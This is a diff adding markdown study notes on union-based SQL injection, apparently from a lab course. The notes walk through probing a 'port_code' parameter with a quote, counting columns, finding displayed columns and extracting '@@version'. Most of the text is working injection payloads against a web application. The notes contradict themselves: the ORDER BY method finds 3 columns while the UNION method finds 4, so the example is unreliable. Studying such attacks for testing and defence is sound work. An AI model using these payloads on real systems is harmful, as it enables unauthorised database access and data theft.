@@ -663,3 +663,70 @@ SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND
   ```sql
   UNION SELECT username, NULL, NULL, NULL FROM passwords-- ';
   ```
+
+---
+
+
+
+# Union Injection in SQL
+
+#### Detecting Vulnerability
+- **Initial Test**: Inject a single quote (`'`) to see if it causes an error.
+  ```sql
+  http://SERVER_IP:PORT/search.php?port_code=cn'
+  ```
+- **Error Response**: Indicates potential SQL injection vulnerability.
+
+#### Detecting Number of Columns
+- **Method 1: Using ORDER BY**
+  - Incrementally add `ORDER BY` clauses until an error occurs.
+  ```sql
+  ' order by 1-- -
+  ' order by 2-- -
+  ' order by 3-- -
+  ' order by 4-- -  -- Error occurs here, meaning there are 3 columns.
+  ```
+
+- **Method 2: Using UNION**
+  - Attempt UNION injection with increasing columns until successful.
+  ```sql
+  cn' UNION select 1,2,3-- -  -- Error
+  cn' UNION select 1,2,3,4-- -  -- Success, meaning there are 4 columns.
+  ```
+
+#### Location of Injection
+- **Identify Displayed Columns**: Use numbers as junk data to see which columns are printed.
+  ```sql
+  cn' UNION select 1,2,3,4-- -
+  ```
+  - Only columns `2`, `3`, and `4` are displayed.
+
+- **Replace with Real Data**: Test with actual data to confirm display.
+  ```sql
+  cn' UNION select 1,@@version,3,4-- -
+  ```
+  - `@@version` will display the database version.
+
+### Steps to Union Injection
+1. **Initial Test for Vulnerability**:
+   - Inject single quote (`'`).
+2. **Detect Number of Columns**:
+   - Use `ORDER BY` or `UNION` to find the number of columns.
+3. **Identify Displayed Columns**:
+   - Inject numbers (`1, 2, 3...`) to see which columns are displayed.
+4. **Replace with Real Data**:
+   - Use SQL queries in identified columns to get desired data.
+
+### Example
+- **Original Query**:
+  ```sql
+  SELECT * FROM ports WHERE port_code = 'cn';
+  ```
+- **Union Injection**:
+  ```sql
+  cn' UNION select 1,@@version,3,4-- -
+  ```
+  - Displays the database version.
+
+---
+
